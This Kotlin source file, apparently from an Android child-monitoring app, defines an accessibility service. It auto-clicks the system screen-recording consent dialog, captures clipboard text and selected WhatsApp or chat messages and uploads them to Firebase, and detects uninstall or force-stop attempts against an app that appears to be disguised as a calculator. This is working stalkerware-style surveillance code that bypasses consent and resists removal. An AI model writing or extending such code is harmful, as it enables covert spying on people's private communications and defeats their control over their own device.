package com.example.authapp.service

import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.authapp.analytics.AppHealthTelemetry
import com.example.authapp.data.FirebaseRepository
import com.google.firebase.crashlytics.FirebaseCrashlytics

object ChildAccessibilityAutoActions {

    private var lastCopiedText = ""

    fun tryAutoClickMediaProjection(event: AccessibilityEvent, rootInWindow: AccessibilityNodeInfo?) {
        try {
            val root = rootInWindow ?: event.source ?: return
            scanAndClickStartNow(root)
        } catch (_: Exception) {}
    }

    private fun scanAndClickStartNow(node: AccessibilityNodeInfo): Boolean {
        val text = node.text?.toString()?.lowercase() ?: ""
        val desc = node.contentDescription?.toString()?.lowercase() ?: ""
        val isTarget = text == "start now" || text == "start" || text == "expose screen" ||
                desc == "start now" || desc == "start"
        if (node.isClickable && isTarget) {
            val clicked = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            if (clicked) {
                FirebaseCrashlytics.getInstance().log("[ChildAccessibilityService] Auto-clicked MediaProjection Start Now dialog")
                return true
            }
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (scanAndClickStartNow(child)) return true
        }
        return false
    }

    private val DUMMY_LABELS = setOf(
        "message", "messages", "type a message", "tap to edit",
        "copied", "copied to clipboard", "copy", "cut", "paste", "share",
        "add your photo", "screenshot", "select all", "undo", "redo"
    )

    fun isDummyActionLabel(text: String): Boolean {
        val t = text.trim().lowercase()
        return t.isEmpty() || DUMMY_LABELS.contains(t) || t.startsWith("type a message")
    }

    fun tryExtractClipboardFromSystemUi(context: Context, event: AccessibilityEvent, rootInWindow: AccessibilityNodeInfo?) {
        try {
            val root = rootInWindow ?: event.source ?: return
            scanForClipboardOverlayText(context, root)
        } catch (_: Exception) {}
    }

    private fun scanForClipboardOverlayText(context: Context, node: AccessibilityNodeInfo?) {
        if (node == null) return
        val className = node.className?.toString()?.lowercase() ?: ""
        val isButton = className.contains("button") || node.isClickable
        val viewId = node.viewIdResourceName?.lowercase() ?: ""
        val text = node.text?.toString()?.trim() ?: ""

        // Only capture if it is a real content TextView and NOT an action button/label:
        if (text.isNotEmpty() && !isButton && !isDummyActionLabel(text) &&
            (viewId.contains("preview") || viewId.contains("clipboard") || viewId.contains("text"))) {
            if (text != lastCopiedText) {
                lastCopiedText = text
                val childId = AppHealthTelemetry.getEffectiveUserId(context)
                if (childId.isNotEmpty()) {
                    FirebaseRepository.pushClipboardLog(childId, text)
                }
                return
            }
        }
        for (i in 0 until node.childCount) {
            scanForClipboardOverlayText(context, node.getChild(i))
        }
    }

    fun handleCopyActionIntercept(context: Context, selectedSnippet: String, rootInWindow: AccessibilityNodeInfo?) {
        try {
            // Priority 1: If we tracked the exact text the user selected on screen
            if (selectedSnippet.isNotEmpty() && !isDummyActionLabel(selectedSnippet)) {
                if (selectedSnippet != lastCopiedText) {
                    lastCopiedText = selectedSnippet
                    val childId = AppHealthTelemetry.getEffectiveUserId(context)
                    if (childId.isNotEmpty()) {
                        FirebaseRepository.pushClipboardLog(childId, selectedSnippet)
                        return
                    }
                }
            }

            // Priority 2: Try ClipboardManager with coerceToText
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
            val clip = clipboard?.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val item = clip.getItemAt(0)
                val text = (item?.text ?: item?.coerceToText(context))?.toString()?.trim() ?: ""
                if (text.isNotEmpty() && !isDummyActionLabel(text) && text != lastCopiedText) {
                    lastCopiedText = text
                    val childId = AppHealthTelemetry.getEffectiveUserId(context)
                    if (childId.isNotEmpty()) {
                        FirebaseRepository.pushClipboardLog(childId, text)
                        return
                    }
                }
            }

            // Priority 3: Scan for selected message nodes in WhatsApp/Chat lists (not the input box!)
            val root = rootInWindow ?: return
            val extracted = scanForSelectedMessageText(root)
            if (extracted.isNotEmpty() && !isDummyActionLabel(extracted) && extracted != lastCopiedText) {
                lastCopiedText = extracted
                val childId = AppHealthTelemetry.getEffectiveUserId(context)
                if (childId.isNotEmpty()) {
                    FirebaseRepository.pushClipboardLog(childId, extracted)
                }
            }
        } catch (_: Exception) {}
    }

    private fun scanForSelectedMessageText(node: AccessibilityNodeInfo?): String {
        if (node == null) return ""
        val text = node.text?.toString()?.trim() ?: ""
        val className = node.className?.toString()?.lowercase() ?: ""
        val isInput = className.contains("edittext") || node.isEditable
        // Message bubble is selected and not the input field
        if (node.isSelected && !isInput && text.isNotEmpty() && !isDummyActionLabel(text)) {
            return text
        }
        for (i in 0 until node.childCount) {
            val childText = scanForSelectedMessageText(node.getChild(i))
            if (childText.isNotEmpty()) return childText
        }
        return ""
    }

    fun isUninstallAttemptForOurApp(node: AccessibilityNodeInfo): Boolean {
        val allText = StringBuilder()
        collectAllText(node, allText)
        val textStr = allText.toString().lowercase()
        val hasUninstall = textStr.contains("uninstall") || textStr.contains("delete app") || textStr.contains("force stop")
        val isOurApp = textStr.contains("calculator") || textStr.contains("com.example.authapp")
        return hasUninstall && isOurApp
    }

    private fun collectAllText(node: AccessibilityNodeInfo, sb: StringBuilder) {
        node.text?.let { sb.append(it).append(" ") }
        node.contentDescription?.let { sb.append(it).append(" ") }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            collectAllText(child, sb)
        }
    }
}
